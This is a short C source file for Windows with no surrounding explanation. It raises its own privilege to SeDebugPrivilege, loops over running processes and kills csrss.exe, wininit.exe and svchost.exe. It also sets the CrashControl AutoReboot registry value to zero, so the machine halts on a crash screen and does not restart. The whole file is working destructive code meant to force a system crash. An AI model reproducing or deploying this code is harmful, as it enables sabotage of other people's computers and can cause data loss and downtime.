#include <Windows.h>
#include <TlHelp32.h>

BOOL EnablePriv()
{
    HANDLE hProc;
    struct _TOKEN_PRIVILEGES NewState;
    HANDLE TokenHandle;

    hProc = GetCurrentProcess();
    if (!OpenProcessToken(hProc, 0x28, &TokenHandle))
     return 0;
 
    LookupPrivilegeValueA(0, "SeDebugPrivilege", (PLUID)NewState.Privileges);
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Attributes = 2;

    AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
    return 0;
}

int KILLCSRSS()
{
      HANDLE hProcessSnap;
      HANDLE hProcess;
      PROCESSENTRY32 pe32;

      hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      if( hProcessSnap == INVALID_HANDLE_VALUE ) { return 1; }
      pe32.dwSize = sizeof(PROCESSENTRY32);
      if(!Process32First(hProcessSnap, &pe32)) { return 1; }
      do
      {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
        if(hProcess != NULL && strcmp(pe32.szExeFile,"csrss.exe")==0) { 
            TerminateProcess(hProcess, 0);
            } else if (strcmp(pe32.szExeFile, "wininit.exe") == 0) {
				TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID), 0);
			 } else if (strcmp(pe32.szExeFile, "svchost.exe") == 0) {
                TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID), 0);
        }
      } while(Process32Next(hProcessSnap, &pe32));

      CloseHandle(hProcessSnap);
      return TRUE;
}
void DisableAutoReboot()
{
	HKEY key;
	RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\CrashControl"), &key);

	DWORD x = 0;
	RegSetValueEx(key, TEXT("AutoReboot"), 0, REG_DWORD, (BYTE*)&x, sizeof(x));
	RegCloseKey(key);
}